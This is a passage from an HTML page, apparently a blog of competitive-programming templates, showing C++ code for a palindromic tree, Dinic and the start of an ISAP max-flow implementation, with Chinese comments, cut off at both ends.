punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="16-Palindromic-Tree"><a href="#16-Palindromic-Tree" class="headerlink" title="16. Palindromic_Tree"></a>16. Palindromic_Tree</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">100005</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Palindromic_Tree</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> next<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//next指针，next指针和字典树类似，指向的串为当前串两端加上同一个字符构成</span><span class="token keyword">int</span> fail<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//fail指针，失配后跳转到fail指针指向的节点</span><span class="token keyword">int</span> cnt<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> id<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> len<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//len[i]表示节点i表示的回文串的长度</span><span class="token keyword">int</span> S<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">//存放添加的字符</span><span class="token keyword">int</span> last<span class="token punctuation">;</span>  <span class="token comment">//指向上一个字符所在的节点，方便下一次add</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>   <span class="token comment">//字符数组指针</span><span class="token keyword">int</span> p<span class="token punctuation">;</span>   <span class="token comment">//节点指针</span><span class="token keyword">int</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//新建节点</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>next<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>cnt<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>id<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>num<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>len<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//初始化</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">newnode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">newnode</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>last <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>S<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//开头放一个字符集中没有的字符，减少特判</span>fail<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">get_fail</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//和KMP一样，失配后找一个尽量最长的</span><span class="token keyword">while</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>n <span class="token operator">-</span> len<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> S<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>x <span class="token operator">=</span> fail<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> x<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>c <span class="token operator">-=</span> <span class="token char">'a'</span><span class="token punctuation">;</span>S<span class="token punctuation">[</span><span class="token operator">++</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token keyword">int</span> cur <span class="token operator">=</span> <span class="token function">get_fail</span><span class="token punctuation">(</span>last<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//通过上一个回文串找这个回文串的匹配位置</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>next<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//如果这个回文串没有出现过，说明出现了一个新的本质不同的回文串</span><span class="token keyword">int</span> now <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span>len<span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//新建节点</span>fail<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">[</span><span class="token function">get_fail</span><span class="token punctuation">(</span>fail<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//和AC自动机一样建立fail指针，以便失配后跳转</span>next<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> now<span class="token punctuation">;</span>num<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>fail<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>last <span class="token operator">=</span> next<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">;</span>cnt<span class="token punctuation">[</span>last<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>id<span class="token punctuation">[</span>last<span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">;</span> <span class="token comment">//id[第last个节点]=第n个字符</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> le <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> tmp<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> le<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span>cnt<span class="token punctuation">[</span>fail<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> cnt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//父亲累加儿子的cnt，因为如果fail[v]=u，则u一定是v的子回文串！</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="17-dinic"><a href="#17-dinic" class="headerlink" title="17. dinic"></a>17. dinic</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">inf</span> <span class="token expression"><span class="token number">1e9</span></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">500</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">,</span>flow<span class="token punctuation">;</span>    <span class="token function">Edge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">Edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> f<span class="token punctuation">,</span><span class="token keyword">int</span> t<span class="token punctuation">,</span><span class="token keyword">int</span> c<span class="token punctuation">,</span><span class="token keyword">int</span> flow<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">from</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">to</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">cap</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">flow</span><span class="token punctuation">(</span>flow<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Dinic</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>Edge<span class="token operator">></span> edges<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cur<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> s<span class="token punctuation">,</span><span class="token keyword">int</span> t<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token operator">-></span>n<span class="token operator">=</span>n<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token operator">-></span>s<span class="token operator">=</span>s<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token operator">-></span>t<span class="token operator">=</span>t<span class="token punctuation">;</span>        edges<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">AddEdge</span><span class="token punctuation">(</span><span class="token keyword">int</span> from<span class="token punctuation">,</span><span class="token keyword">int</span> to<span class="token punctuation">,</span><span class="token keyword">int</span> cap<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        edges<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token function">Edge</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token function">Edge</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span>from<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        m <span class="token operator">=</span> edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>from<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token function">BFS</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>vis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> Q<span class="token punctuation">;</span>        d<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> x<span class="token operator">=</span>Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                Edge<span class="token operator">&amp;</span> e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>cap<span class="token operator">></span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>                    Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>to<span class="token punctuation">)</span><span class="token punctuation">;</span>                    d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token operator">+</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> vis<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">DFS</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> a<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">==</span>t <span class="token operator">||</span> a<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> a<span class="token punctuation">;</span>        <span class="token keyword">int</span> flow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>f<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">&amp;</span> i<span class="token operator">=</span>cur<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            Edge<span class="token operator">&amp;</span> e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">==</span>d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>f<span class="token operator">=</span><span class="token function">DFS</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>to<span class="token punctuation">,</span><span class="token function">min</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>e<span class="token punctuation">.</span>cap<span class="token operator">-</span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span>flow<span class="token operator">+=</span>f<span class="token punctuation">;</span>                edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flow <span class="token operator">-=</span>f<span class="token punctuation">;</span>                flow<span class="token operator">+=</span>f<span class="token punctuation">;</span>                a<span class="token operator">-=</span>f<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> flow<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">dinic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> flow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">BFS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">memset</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            flow <span class="token operator">+=</span> <span class="token function">DFS</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>inf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> flow<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>DC<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        DC<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>m<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> u<span class="token punctuation">,</span>v<span class="token punctuation">,</span>w<span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%d%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>u<span class="token punctuation">,</span><span class="token operator">&amp;</span>v<span class="token punctuation">,</span><span class="token operator">&amp;</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>            DC<span class="token punctuation">.</span><span class="token function">AddEdge</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span>v<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>DC<span class="token punctuation">.</span><span class="token function">dinic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="18-ISAP"><a href="#18-ISAP" class="headerlink" title="18. ISAP"></a>18. ISAP</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">1000</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INF</span> <span class="token expression"><span class="token number">100000000</span></span></span><span class="token keyword">struct</span> <span class="token class-name">Edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">,</span>flow<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">ISAP</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>Edge<span class="token operator">></span>edges<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>G<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> vis<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>cur<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> p<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>num<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//比Dinic算法多了这两个数组，p数组标记父亲结点，num数组标记距离d[i]存在几个</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>             d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> cur<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> from<span class="token punctuation">,</span><span class="token keyword">int</span> to<span class="token punctuation">,</span><span class="token keyword">int</span> cap<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        edges<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Edge<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Edge<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>to<span class="token punctuation">,</span>from<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m<span class="token operator">=</span>edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>from<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">Augumemt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> x<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token 